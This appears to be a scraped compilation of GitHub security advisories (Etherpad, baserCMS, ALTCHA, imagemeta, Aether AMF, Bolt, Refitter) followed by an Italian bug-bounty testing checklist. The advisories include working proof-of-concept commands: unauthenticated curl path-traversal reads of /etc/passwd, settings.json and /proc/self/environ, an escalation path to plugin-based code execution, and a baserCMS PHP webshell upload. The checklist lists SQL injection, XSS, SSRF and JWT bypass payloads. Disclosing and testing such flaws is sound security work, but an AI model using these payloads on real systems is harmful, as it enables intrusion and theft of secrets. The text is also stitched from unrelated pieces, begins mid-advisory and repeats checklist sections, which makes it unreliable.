Build-time SSRF (CWE-918) from the developer or CI host, disclosure of arbitrary local files
(CWE-22), and inclusion of untrusted remote content (CWE-829), from running Refitter on an
attacker-controlled or attacker-influenced OpenAPI description. No code execution. Estimated
Medium-High, e.g. `[reproduce.sh](https://github.com/user-attachments/files/29395269/reproduce.sh)` (the CNA sets the final score).

### Suggested fix

Don't resolve remote `$ref`s by default (opt-in + host allowlist); confine local `$ref` resolution to
the input directory tree (reject absolute paths and `../` escapes). Apply at all nesting levels.
Coordinate with NJsonSchema, where the resolver lives.

titolo: GHSA-mc8w-wjhw-45x5: Etherpad: Pre-auth arbitrary file read
descrizione:
### Summary

An unauthenticated path‑traversal / arbitrary file read vulnerability in Etherpad's /static/* handler allows any remote, unauthenticated user to read any file on the server's filesystem (e.g. GET /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd returns /etc/passwd) available to the user running the etherpad software. Because the endpoint is mounted before the authentication middleware, no credentials, session, or configuration change are required. The read primitive could escalate to a full server compromise: on a typical deployment by disclosing settings.json / credentials.json / /proc/self/environ, which contain the admin password, giving an attacker an admin session and, through the admin plugin installer, remote code execution.

### Details

Etherpad serves plugin static assets through src/node/utils/Minify.ts. The request path is first passed through the canonical sanitizer src/node/utils/sanitizePathname.ts, which is careful to convert backslashes to forward slashes only on Windows:

```
// src/node/utils/sanitizePathname.ts:11-20
p = pathApi.normalize(p);
if (pathApi.isAbsolute(p)) throw new Error(`absolute paths are forbidden: ${p}`);
if (p.split(pathApi.sep)[0] === '..') throw new Error(`directory traversal: ${p}`);
// THIS CONVERSION MUST ONLY BE DONE ON WINDOWS, otherwise on POSIXish systems '..\\' in the input
// pathname would not be normalized away before being converted to '../'.
if (pathApi.sep === '\\') p = p.replace(/\\/g, '/');
```

On Linux a backslash is an ordinary filename byte, so an input segment like ..\..\..\test contains no ./.. path components and passes every check in sanitizePathname unchanged. The project's own test suite confirms this: src/tests/backend-new/specs/sanitizePathname.ts:62 lists ['posix', '..\\foo'] among the accepted paths (returned unchanged).

The vulnerability is that Minify.ts then performs that Windows‑only conversion unconditionally, after the sanitizer has run, justified by a comment asserting the opposite of the invariant above:

```
// src/node/utils/Minify.ts:171-186
const match = filename.match(/^plugins\/([^/]+)(\/(?:(static\/.*)|.*))?$/);
if (match) {
const library = match[1];
const libraryPath = match[2] || '';
if (plugins.plugins[library] && match[3]) {
const plugin = plugins.plugins[library];
const pluginPath = plugin.package.realPath;      // for 'ep_etherpad-lite' == <root>/src
filename = path.join(pluginPath, libraryPath);   // -> absolute path, backslashes preserved
// ... "This conversion does not introduce a directory
// traversal vulnerability because all '..\\' substrings have already been removed by
// sanitizePathname."                              // <-- FALSE on POSIX
filename = filename.replace(/\\/g, '/');          // <-- reintroduces ../ AFTER the check
}
```

After line 186 the string becomes a real traversal (<root>/src/static/../../../../etc/passwd) with no re‑normalization and no containment check
before the filesystem calls at Minify.ts:248 (fs.stat) and Minify.ts:315 (fs.readFile). Because path.join at line 179 produced an absolute
path, path.resolve(ROOT_DIR, filename) discards ROOT_DIR entirely, and POSIX path.resolve collapses surplus .. at /, so the payload is root‑depth‑agnostic.

The route is reachable pre‑authentication. It is registered on the expressPreSession hook:

```
// src/ep.json
{ "name": "static", "hooks": { "expressPreSession": "ep_etherpad-lite/node/hooks/express/static" } }
// src/node/hooks/express/static.ts:38
app.all('/static/*filename', minify);
```

and expressPreSession runs before the auth middleware:

```
// src/node/hooks/express.ts:244-247
await hooks.aCallAll('expressPreSession', {app, settings});   // static route registered here
app.use(exports.sessionMiddleware);
app.use(webaccess.checkAccess);                                // auth runs AFTER
```

The plugin branch is always taken because src/static/js/pluginfw/plugins.ts:153-158 unconditionally registers the core pseudo‑plugin ep_etherpad-lite with package.realPath = <root>/src.

Two decode facts make the exploit functional: Express 5 / path‑to‑regexp v8 decode wildcard params per segment, once ((v) =>  v.split('/').map(decodeURIComponent)), so req.params.filename.join('/') (Minify.ts:147) yields the once‑decoded path fed to the sanitizer, and %5C (encoded backslash) is the only working separator (%2F decodes to /, is re‑split, and is rejected by the split('/')[0] === '..' guard).

### PoC

Applies to a default production deployment (no special configuration; works on Linux, e.g. the Docker image or a systemd source install). Replace TARGET:9001 with the instance.

1. Read /etc/passwd (or any file) with no authentication. --path-as-is prevents the client from folding the traversal:

```
curl --path-as-is \
'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd'
```

Other high‑value reads (over‑shoot the .. depth; it is absorbed at /):

admin password + secrets, root-agnostic via /proc/self/cwd
```
curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/settings.json'
curl --path-as-is
'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/credentials.json'
```
on docker-compose deployments the admin password is an env var:
`curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/environ'`

Each response returns the raw file bytes (with a harmless Content-Type: false header for extension‑less targets, Node coerces the value and does not throw).

2. Escalate to RCE. Recover the admin credential from the files read in step 1, then:

mint an admin session
```
curl -i -X POST 'http://TARGET:9001/admin-auth/' \
-H "Authorization: Basic $(printf 'admin:PASSWORD' | base64)"
# -> 200 + Set-Cookie: <prefix>express_sid=...
```

Using that express_sid cookie, connect to the /pluginfw/installer Socket.IO namespace (gated only on session.user.is_admin, src/node/hooks/express/adminplugins.ts:22) and emit install for an attacker‑controlled ep_* plugin. Etherpad require()s the plugin's code in‑process during plugins.update() (src/static/js/pluginfw/shared.ts:30), executing arbitrary code as the Etherpad user.

### Impact

- Type: Improper limitation of a pathname → unauthenticated arbitrary file read, with potential to remote code execution.
- Access required: None. The vulnerable route is served before the authentication/authorization middleware, so it is exploitable by any client that can reach the HTTP port, regardless of requireAuthentication, requireAuthorization, or users configuration.
- What an attacker can access: any file readable by the Etherpad process user, including settings.json/credentials.json (admin password, sessionKey, database credentials, SSO client secrets), /proc/self/environ (env‑supplied secrets such as ADMIN_PASSWORD, DB_PASS), the pad database, TLS private keys, and OS files such as /etc/passwd.
- Escalation: the disclosed admin password yields an admin session; the admin plugin installer then provides in‑process code execution, i.e. full server takeover. Even without the plugin step, admin access permits rewriting the entire configuration (saveSettings + restartServer) and exfiltrating all stored data.
- Who is impacted: every operator running an affected version, most severely those exposing Etherpad directly to untrusted networks. A reverse proxy does not mitigate it, the traversal uses %5C, which proxies forward unchanged.

titolo: GHSA-gfwj-45pc-w6r5: ALTCHA: Nil-map panic (pre-verification DoS) in v1 parseServerSignature on malformed VerificationData
descrizione:
### Summary

`parseServerSignature` in the v1 module only initializes `ServerSignatureVerificationData.Extra` inside the `if err == nil` branch after `url.ParseQuery(parsedPayload.VerificationData)`. Go's `url.ParseQuery` returns the successfully-parsed pairs together with a non-nil error when the query string contains a malformed percent-escape. A subsequent loop unconditionally writes unknown keys into `Extra`, regardless of `err`, causing a nil-map write panic (assignment to entry in nil map) whenever an attacker supplies a `VerificationData` string with a bad %-escape (e.g. `x=1&%zz=2`).

This is reachable pre-authentication: `parseServerSignature` is called by the exported `VerifyServerSignature` / `VerifyServerSignatureSafe` before any HMAC/signature check, and `VerificationData` is attacker-controlled data forwarded by the client as part of the ALTCHA server-signature payload.

### Impact

Any application calling `VerifyServerSignature` or `VerifyServerSignatureSafe` on unauthenticated input can be made to panic by submitting a crafted payload. Under standard net/http, the per-request goroutine panic is recovered and the request aborts (a log-flood / per-request DoS); it escalates to a full process crash if verification runs in an application-spawned goroutine or a non-recovering framework.

### Proof Of Concept

```go
payload, _ := json.Marshal(ServerSignaturePayload{
    Algorithm:        SHA256,
    VerificationData: "x=1&%zz=2",
    Signature:        "irrelevant",
    Verified:         true,
})
encoded := base64.StdEncoding.EncodeToString(payload)
VerifyServerSignature(encoded, "some-secret") // panics: assignment to entry in nil map

```

### Patch

`Extra` is now initialized unconditionally before the `url.ParseQuery` error check, so it's always safe to write into regardless of parse errors.

### Workarounds

Recover from panics around calls to `VerifyServerSignature`/`VerifyServerSignatureSafe`, or reject/sanitize `VerificationData` before calling them, until upgrading.

### Patch

Patch commit: 2c4fc27

### Credit

Reported by Arpit Jain (@arpitjain099) via private disclosure.

titolo: GHSA-7hvw-3c2q-45qg: bep/imagemeta: Unbounded memory allocation decoding PNG `zTXt` "Raw profile type iptc" chunks
descrizione:
A crafted PNG can make `imagemeta.Decode` allocate memory far in excess of the input file's size, leading to memory exhaustion. Two separate paths in the `zTXt` "Raw profile type iptc" branch are affected: the declared chunk length drives an allocation directly, and the embedded zlib stream is decompressed without an output bound. A 42-byte file allocated 256 MB, and a 127 KB file allocated 460 MB.

### Impact

Denial of service by memory exhaustion against any application that decodes untrusted PNG images with this library. The decompression bomb is the more reliable vector, since it produces genuinely resident memory; the effect of the oversized `make` depends on the platform's overcommit behavior and any configured `GOMEMLIMIT` or cgroup limit.

### Patches

Fixed in v0.17.3. 

### Workarounds

Reject or bound PNG input size before calling `Decode`, or clear `IPTC` from `Options.Sources` if IPTC metadata is not required.

### Credits

Reported by Arpit Jain ([@arpitjain099](https://github.com/arpitjain099)).

titolo: GHSA-v6w5-38cf-pcv8: Aether Project amf: panic on an unrecovered NGAP goroutine
descrizione:
## Summary

HandlePathSwitchRequest guards the UESecurityCapabilities IE for presence but never for length, and the extensible APER type silently yields an empty bit string, so six unguarded index-zero reads panic on an unrecovered goroutine and terminate the AMF. The AMF is the control-plane entry point for a 5G core, so terminating it drops mobility management for every subscriber. Confirmed at HEAD daed5a2 (present in v3.1.5).

## The defect

ngap/handler.go:

```go
if uESecurityCapabilities != nil {                                                                              // line 3267, PRESENCE only
    amfUe.UESecurityCapability.SetEA1_128_5G((uESecurityCapabilities.NRencryptionAlgorithms.Value.Bytes[0] & 0x80) >> 7)   // line 3268
    ... (five more Bytes[0] reads, lines 3269-3273)
}
```

Six index-zero reads, all guarded only by a nil check on the containing IE. Why the bit string can be empty: the field is declared `aper:"sizeExt,sizeLB:16,sizeUB:16"`. Because the type is EXTENSIBLE, parseBitString DISCARDS the SIZE(16) constraint when the peer sets the extension bit, and then `if rawLength == 0 { return bitString, nil }` returns a bit string with an empty Bytes slice and NO ERROR. So the decoder hands the handler a well-formed, error-free value whose Bytes has length zero, and the handler indexes it. The length guarantee the maintainers rely on comes from an ASN.1 SIZE constraint that the encoder rules legitimately waive on the extension path.

## Verification

Proven dynamically, not by reading. Eight crafted bytes (40 00 80 00 80 00 80 00) decode cleanly through the REAL APER decoder, and the handler's exact expression then panics with "index out of range [0] with length 0". Panic discipline was checked first: the NGAP receive path has NO recover() (the only recover in the package is on SendToRan, the transmit path), so this is a genuine process kill and the AMF terminates.

Attacker model, stated conservatively: a rogue or compromised gNB on the N2 interface, which additionally needs one registered UE's AMF-UE-NGAP-ID. This is NOT reachable by a bare over-the-air UE; the realistic scenario is a compromised or malicious base station, the threat model N2 security exists to address.

## Suggested fix

Check the length of Bytes before indexing, in all six places, and treat a short or empty bit string as a malformed IE with a PathSwitchRequestFailure rather than proceeding. More durably: since the SIZE constraint is waived on the extension path by design, no aper-decoded bit string can be assumed non-empty, so the same check is needed anywhere else a decoded bit string is indexed. Deduplicated against all eleven existing omec advisories and against hardening commit 030fe7c, which enumerated its sites and MISSED this handler.

## Tooling

AI assistance was used while investigating. The panic was reproduced by driving the real APER decoder with crafted bytes and then the handler's exact expression, and the absence of recover() on the receive path was verified by enumeration rather than assumed. The reporter separately confirmed the six unguarded index-zero reads behind a presence-only check at HEAD.

titolo: GHSA-wgvx-x5g3-9v29: baserCMS administrative API authorization bypass through session fallback
descrizione: ### Summary An authorization bypass occurs against the API endpoint `/baser/api/admin/` by abusing the session authentication fallback. ### Details The mail settings are used here as an example. Admin side: https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L100 With `auth => false`, it is not accessible with operator privileges. API side: https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L286 With `auth => true`, it is accessible even with operator privileges. --- First, the default group for operators has `auth_prefix = 'Admin'`, which does not include `Api/Admin`. https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/Model/Table/UsersTable.php#L389 Because of this condition, when trying to access the `Api/Admin` API with a JWT, operators have `auth_prefix = 'Admin'`, so they cannot obtain a JWT and should not be able to access it. However, there is a problem in `getAuthenticationService`. https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/BaserCorePlugin.php#L507 Here, session authentication is enabled even for the `Api/Admin` prefix. By accessing the API with a Referer header, session authentication becomes active, allowing access to the API without holding a JWT. As a result, all APIs configured with `auth => true` in `permission.php` become accessible by operators. ### PoC 1. Log in with a site operator (operator) privileged account. 2. Run the following code in DevTools: ```javascript fetch('/baser/api/admin/baser-core/site_configs/view.json', { headers: { 'Referer': location.origin + '/baser/admin/' } }) .then(r => r.json()) .then(d => { console.table(d.siteConfig); }) ```

titolo: GHSA-2pj4-v76f-wjvx: baserCMS: Path Traversal Bypass via realpath() in BcThemeFileService (CVE-2026-30940 Patch Bypass)
descrizione:
### Summary

The security patch introduced in baserCMS 5.2.3 to address CVE-2026-30940 / [GHSA-c5c6-37vq-pjcq](https://github.com/baserproject/basercms/security/advisories/GHSA-c5c6-37vq-pjcq) is **incomplete**. The patch added a `realpath()`-based directory traversal check in `BcThemeFileService::getFullpath()`, but the check is **entirely skipped** when `realpath($baseDir)` returns `false` — which occurs whenever the target subdirectory does not physically exist on disk.

An authenticated administrator can bypass the patch by supplying a `type` value (e.g., `js`) that maps to a non-existent directory in the theme. The absence of the directory causes `realpath()` to return `false`, the validation block is skipped, and the raw `path` parameter containing `../` sequences is returned unvalidated. This enables arbitrary file write and remote code execution (RCE) — the exact same impact as the original CVE.

**This vulnerability was verified exploitable on baserCMS 5.2.3 (the "patched" version of CVE-2026-30940).**

### Details

The vulnerability exists in `BcThemeFileService::getFullpath()` at [`plugins/bc-theme-file/src/Service/BcThemeFileService.php` lines 70–82](https://github.com/baserproject/basercms/blob/5.2.x/plugins/bc-theme-file/src/Service/BcThemeFileService.php#L70):

```php
public function getFullpath(string $theme, string $plugin, string $type, string $path)
{
    // ...build $baseDir and $fullPath from $theme, $type, $path...
    $baseDir  = $viewPath . $type . DS;      // e.g. .../BcThemeSample/webroot/js/
    $fullPath = $baseDir  . $path;           // e.g. .../webroot/js/../../../../webroot/

    $resolvedBase = realpath($baseDir);
    if ($resolvedBase !== false) {           // ← BYPASS: entire block skipped when dir absent
        $resolvedBase = rtrim($resolvedBase, DS) . DS;
        $targetDir = realpath(dirname($fullPath));
        if ($targetDir === false) {
            $targetDir = $this->normalizePath(dirname($fullPath));
        }
        if (!str_starts_with(rtrim($targetDir, DS) . DS, $resolvedBase)) {
            throw new BcException(__d('baser_core', 'パスにテーマディレクトリ外への参照が含まれています。'));
        }
    }

    return $fullPath;   // ← Returns unvalidated path when realpath returns false
}
```

**Root cause — the bypass condition:**

| `realpath($baseDir)` result | Behavior |
|-----------------------------|----------|
| Valid path string (dir **exists**) | Validation runs → `../` traversal **blocked** ✓ |
| `false` (dir does **not** exist) | Validation **skipped entirely** → `../` traversal **allowed** ✗ |

**Difference from CVE-2026-30940 (original bug):**

| | CVE-2026-30940 (≤ 5.2.2) | This bypass (5.2.3) |
|--|--|--|
| Validation | None at all | `realpath()` check — but conditional |
| `type` needed | Any valid type (`layout`, `cell`, …) | Must map to a **non-existent** subdirectory |
| `path` blocked | Never | Only when target dir already exists |
| Root cause | Missing validation | `if ($resolvedBase !== false)` skips false case |

### PoC

**Prerequisites:**
- baserCMS 5.2.3 (the officially patched version of CVE-2026-30940)
- Admin credentials
- `USE_CORE_ADMIN_API=true` in `.env`
- BcThemeFile plugin installed and BcThemeSample theme loaded

**Step 1 — Login and obtain JWT token:**

```bash
curl -s -X POST "http://localhost/baser/api/admin/baser-core/users/login.json" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"password"}'
# Response: {"access_token":"eyJ0eXA...","refresh_token":"eyJ0eXA..."}
```

**Step 2 — Verify bypass condition (webroot/js/ must not exist):**

The bypass requires `type=js` to map to a non-existent directory. Confirm:

```bash
# webroot/js/ does NOT exist → realpath() returns false → validation SKIPPED
ls plugins/BcThemeSample/webroot/
# Expected output: css  img   (no js/)
```

**Step 3 — Exploit: write PHP webshell directly to webroot:**

Path calculation from `baseDir = .../BcThemeSample/webroot/js/`:
- `js/` (1 up) → `webroot/`
- `webroot/` (2 up) → `BcThemeSample/`
- `BcThemeSample/` (3 up) → `plugins/`
- `plugins/` (4 up) → `/var/www/html/` + `webroot/`
- Result: `../../../../webroot/` → `/var/www/html/webroot/`

```bash
TOKEN="eyJ0eXA..."   # from step 1

curl -s -X POST "http://localhost/baser/api/admin/bc-theme-file/theme_files/add.json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "theme":    "BcThemeSample",
    "plugin":   "",
    "type":     "js",
    "path":     "../../../../webroot/",
    "base_name":"rce_direct",
    "ext":      "php",
    "contents": "<?php echo shell_exec($_GET[\"c\"]); ?>"
  }'
# Response: HTTP 200 {"message":"ファイル「rce_direct.php」を作成しました。",...}
```

**Step 4 — Execute RCE:**

```bash
curl "http://localhost/rce_direct.php?c=id"
# Output: uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```

**Verified output (Docker, baserCMS 5.2.3):**

```
=RCE_DIRECT=uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```
### Impact

An authenticated administrator can achieve remote code execution by writing an arbitrary PHP file to any directory accessible by the web server — including `webroot/`, `config/`, or `tmp/`. This is the identical impact as CVE-2026-30940, rendering the 5.2.3 patch ineffective.

The vulnerability is particularly significant because:

1. **Patch bypass:** Operators and users who upgraded to 5.2.3 specifically to address CVE-2026-30940 remain vulnerable.
2. **Arbitrary directory write:** The bypass allows writing to `webroot/` (directly HTTP-accessible), `config/` (application configuration), or any other directory writable by the PHP process.
3. **File deletion and overwrite:** Beyond RCE, the attacker can delete or overwrite critical files, causing denial of service or persistent backdoors.
4. **One-shot per non-existent directory:** The exploit creates the target directory as a side effect. Rotating to other unused `type` values (e.g., `font`, `audio`, any arbitrary string) restores the bypass condition.

**CVSS v3.1:** `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` — Score: **7.2 (High)**  
Same as CVE-2026-30940 — attack complexity is unchanged by the incomplete patch.

### Recommended Fix

The patch must validate the path **unconditionally**, regardless of whether `$baseDir` exists on disk. Replace the `realpath()`-conditional block with `normalizePath()` (already defined in the same class):

```php
// CURRENT (vulnerable — skips validation when $baseDir does not exist)
$resolvedBase = realpath($baseDir);
if ($resolvedBase !== false) {
    // ... validation only runs here ...
}
return $fullPath;

// FIXED — always validate using normalizePath()
$normalizedBase   = rtrim($this->normalizePath($baseDir),            DS) . DS;
$normalizedTarget = rtrim($this->normalizePath(dirname($fullPath)),  DS) . DS;

if (!str_starts_with($normalizedTarget, $normalizedBase)) {
    throw new BcException(__d('baser_core', 'パスにテーマディレクトリ外への参照が含まれています。'));
}
return $fullPath;
```

Additionally, the `path` and `ext` parameters should be validated at the API controller layer:

```php
// In ThemeFilesController — validate before calling getFullpath()
if (preg_match('/\.\./', $data['path'])) {
    throw new BcException('Invalid path parameter.');
}
if (!preg_match('/^[a-zA-Z0-9]+$/', $data['ext'])) {
    throw new BcException('Invalid extension.');
}
```

### References

- [GHSA-c5c6-37vq-pjcq — Original CVE-2026-30940 advisory](https://github.com/baserproject/basercms/security/advisories/GHSA-c5c6-37vq-pjcq)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-706: Use of Incorrectly-Resolved Name or Reference](https://cwe.mitre.org/data/definitions/706.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- `plugins/bc-theme-file/src/Service/BcThemeFileService.php` — `getFullpath()`, lines 70–82
- `plugins/bc-theme-file/src/Form/ThemeFileForm.php` — `_execute()`, lines 64–69
- `plugins/bc-theme-file/src/Controller/Api/Admin/ThemeFilesController.php` — `add()`, lines 38–60

### Attribution
Reported by Nguy Minh Tuan of Sun* Cyber Security Research Team.

titolo: GHSA-3xjf-9q55-vxw4: Bolt: Prevent SSRF due to unchecked followed redirects
descrizione:
### Impact

The `/bolt/async/upload-url` and `/bolt/async/embed` endpoints validated only the **submitted** URL before fetching it server-side, but the fetch then **followed redirects to destinations that were never re-validated**. This allowed an authenticated user to bypass the SSRF guard (`UrlSafetyChecker`) and make the server issue requests to internal/cloud-metadata addresses.

### Patches

This issue has been patched with Bolt 6.1.5.

testingTechniques.name: Ricognizione & Enumerazione

steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

Step 8: Sii paziente: Google VRP è molto competitivo

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
